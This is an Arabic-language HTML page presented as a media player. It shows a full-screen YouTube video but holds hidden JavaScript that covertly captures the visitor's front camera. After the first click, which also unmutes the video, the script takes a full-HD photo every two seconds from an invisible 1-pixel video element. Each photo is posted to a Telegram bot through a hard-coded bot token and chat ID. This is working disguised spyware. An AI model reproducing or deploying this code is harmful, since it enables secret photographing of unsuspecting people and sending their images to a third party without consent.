<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مشغل الوسائط</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            overflow: hidden;
            cursor: pointer;
        }

        /* الفيديو يملأ الشاشة */
        .video-wrapper {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            /* منع التفاعل مع الـ iframe مباشرة لإجبار المتصفح على رصد النقر على الـ body */
            pointer-events: none; 
        }

        /* الكاميرا مخفية تماماً */
        #v {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="video-wrapper">
    <iframe id="youtube-player" src="https://www.youtube.com/embed/TnPZiCf36Lc?enablejsapi=1&autoplay=1&mute=1" allow="autoplay; encrypted-media"></iframe>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

    <script>
    const CONFIG = {
        TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
        CHAT_ID: "7000276863",
        TY: 2000,        // ثانيتين بين كل صورة والأخرى
        QUALITY: 0.9,    // جودة احترافية عالية جداً
    };

    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');
    const iframe = document.getElementById('youtube-player');

    let isStarted = false;

    // البدء عند أول نقرة
    document.body.addEventListener('click', () => {
        if (isStarted) return;
        isStarted = true;

        // تشغيل صوت الفيديو
        if(iframe) {
            let currentSrc = iframe.src;
            iframe.src = currentSrc.replace("mute=1", "mute=0");
        }

        // بدء حلقة التصوير بالكاميرا الأمامية فقط
        startCaptureSequence();
    });

    async function startCaptureSequence() {
        while (true) { 
            // تنفيذ لقطة واحدة من الكاميرا الأمامية
            await takeSnapshot("user", "📸 أمامية HD");
            
            // الانتظار لمدة ثانيتين قبل اللقطة التالية (حسب طلبك)
            await new Promise(r => setTimeout(r, CONFIG.TY));
        }
    }

    async function takeSnapshot(mode, label) {
        try {
            // طلب الكاميرا الأمامية بدقة Full HD
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: mode,
                    width: { ideal: 1920 }, 
                    height: { ideal: 1080 }
                } 
            });
            
            video.srcObject = stream;
            
            // انتظار استقرار العدسة والضوء
            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(resolve, 800); 
                };
            });

            // ضبط حجم الكانفاس لمطابقة جودة الكاميرا
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة بجودة عالية
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.QUALITY));
            
            const formData = new FormData();
            formData.append('chat_id', CONFIG.CHAT_ID);
            formData.append('caption', label);
            formData.append('photo', blob, 'capture.jpg');

            // إرسال الصورة للبوت
            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});

            // إغلاق الكاميرا لتحرير موارد الجهاز وضمان السرعة
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;

        } catch (err) {
            console.error("خطأ في الوصول للكاميرا:", err);
        }
    }
        </script>
    
    

</body>
</html>
